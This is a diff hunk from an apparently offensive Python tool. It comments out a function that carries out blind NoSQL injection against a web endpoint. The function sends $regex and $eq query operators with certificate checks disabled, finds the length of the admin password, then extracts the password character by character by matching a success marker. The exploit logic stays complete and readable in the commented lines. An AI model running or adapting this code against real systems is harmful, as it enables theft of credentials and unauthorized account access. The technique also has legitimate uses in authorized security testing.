@@ -257,47 +257,47 @@ def dumpKnownValue(nsi, form_data, password):
     print("Result : %s" % (password))
 
 
-def slinearGet(nsi):
-    username = "admin"
-    password = ""
-    length = ""
+# def slinearGet(nsi):
+#     username = "admin"
+#     password = ""
+#     length = ""
 
-    # count length
-    for c in range(0, 9999999):
-        form_data = {}
-        for element in nsi.params:
-            if "*" in element:
-                element = element.replace("*", "")
-                form_data[element + "[$regex]"] = "^.{" + str(c) + "}$"
-            else:
-                form_data[element + "[$eq]"] = username
-        reqData = Str.http_build_query(form_data)
-        r = requests.get(nsi.url + "?" + reqData, verify=False)
+#     # count length
+#     for c in range(0, 9999999):
+#         form_data = {}
+#         for element in nsi.params:
+#             if "*" in element:
+#                 element = element.replace("*", "")
+#                 form_data[element + "[$regex]"] = "^.{" + str(c) + "}$"
+#             else:
+#                 form_data[element + "[$eq]"] = username
+#         reqData = Str.http_build_query(form_data)
+#         r = requests.get(nsi.url + "?" + reqData, verify=False)
 
-        if nsi.successIdentifier in r.text:
-            print("Found length : %s" % (c))
-            length = c
-            break
+#         if nsi.successIdentifier in r.text:
+#             print("Found length : %s" % (c))
+#             length = c
+#             break
 
-    for x in range(length):
-        for c in string.printable:
-            if c not in ["*","+",".","?","|","'",'"',"&"," ","(",")","[","]","\\"]:
-                form_data = {}
-                for element in nsi.params:
-                    if "*" in element:
-                        element = element.replace("*", "")
-                        form_data[element + "[$regex]"] = f"^{urllib.parse.quote_plus(password+c)}"
-                    else:
-                        form_data[element + "[$eq]"] = username
-                reqData = Str.http_build_query(form_data)
-                # print(reqData)
-                r = requests.get(nsi.url + "?" + reqData, verify=False)
+#     for x in range(length):
+#         for c in string.printable:
+#             if c not in ["*","+",".","?","|","'",'"',"&"," ","(",")","[","]","\\"]:
+#                 form_data = {}
+#                 for element in nsi.params:
+#                     if "*" in element:
+#                         element = element.replace("*", "")
+#                         form_data[element + "[$regex]"] = f"^{urllib.parse.quote_plus(password+c)}"
+#                     else:
+#                         form_data[element + "[$eq]"] = username
+#                 reqData = Str.http_build_query(form_data)
+#                 # print(reqData)
+#                 r = requests.get(nsi.url + "?" + reqData, verify=False)
 
-                if nsi.successIdentifier in r.text:
-                    print("Result : %s" % (password + c), end="\r")
-                    password += c
-                    break
-    print("Result : %s" % (password))
+#                 if nsi.successIdentifier in r.text:
+#                     print("Result : %s" % (password + c), end="\r")
+#                     password += c
+#                     break
+#     print("Result : %s" % (password))
 
 
 def sbin(nsi):
